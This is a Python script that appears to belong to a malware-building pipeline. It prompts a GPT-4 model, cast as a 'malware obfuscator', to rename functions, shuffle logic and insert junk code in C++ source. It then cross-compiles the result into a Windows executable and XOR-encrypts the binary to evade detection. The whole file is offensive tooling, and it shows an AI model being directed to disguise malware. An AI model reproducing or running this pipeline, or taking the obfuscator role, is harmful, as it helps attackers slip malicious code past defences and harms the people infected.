import openai
import subprocess
import random
import string

openai.api_key = "sk-xxxx"  # Use managed identity or Key Vault in prod

def mutate_source(src_file: str, morph_id: str) -> str:
    with open(f"./src/{src_file}", 'r') as f:
        code = f.read()
    
    # Prompt Codex to mutate malware code
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are a malware obfuscator. Rename functions, shuffle logic, insert junk code."},
            {"role": "user", "content": code}
        ]
    )
    mutated_code = response.choices[0].message.content
    
    output_path = f"./mutated/{morph_id}.cpp"
    with open(output_path, 'w') as out:
        out.write(mutated_code)
    
    return output_path

def compile_payload(mutated_path: str) -> str:
    bin_out = mutated_path.replace(".cpp", ".exe")
    subprocess.run(["x86_64-w64-mingw32-g++.exe", "-o", bin_out, mutated_path])
    return bin_out

def encrypt_binary(bin_path: str, key: str) -> bytes:
    with open(bin_path, "rb") as f:
        data = f.read()
    encrypted = bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])
    return encrypted
